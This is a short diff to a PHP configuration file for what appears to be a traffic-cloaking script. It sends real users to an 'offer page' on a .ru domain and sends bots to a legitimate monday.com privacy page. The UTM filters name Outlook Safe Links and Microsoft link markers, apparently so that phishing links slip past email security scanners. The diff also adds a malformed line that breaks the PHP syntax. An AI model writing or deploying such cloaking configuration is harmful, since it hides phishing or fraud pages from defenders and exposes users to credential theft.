@@ -3,7 +3,7 @@
 $HCSET['PASSIVE'] = false;
 
 /* Required settings     */
-$HCSET['OFFER_PAGE'] = 'https://techluminizesa.ru/';//PHP/HTML file or URL offer used for real users
+$HCSET['OFFER_PAGE'] = 'https://techluminizesa.ru/Ma4Y/';//PHP/HTML file or URL offer used for real users
 $HCSET['WHITE_PAGE'] = 'https://monday.com/l/privacy/privacy-policy/';//PHP/HTML file or URL used for bots
 $HCSET['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 /*********************************************/
@@ -19,8 +19,7 @@ $HCSET['FILTER_DEV_LIST'] = ''; // string([d_Windows|m_Android|m_iOS|d_macOS|m_o
 
 /* UTM FILTERS */
 $HCSET['FILTER_UTM_MODE'] = 'allow'; // 'allow|reject'
-$HCSET['FILTER_UTM_LIST'] = 'Ma4Y'; // 'regExp()';
-/* $HCSET['FILTER_UTM_LIST'] = 'utm_NA, fwlink, LinkId, nam11, safelink, Ma4Y'; // 'regExp()'; */
+* $HCSET['FILTER_UTM_LIST'] = 'utm_NA, fwlink, LinkId, nam11, safelink, Ma4Y'; // 'regExp()'; 
 
 /* REFERER FILTERS */
 $HCSET['FILTER_REF_MODE'] = ''; // 'allow|reject'
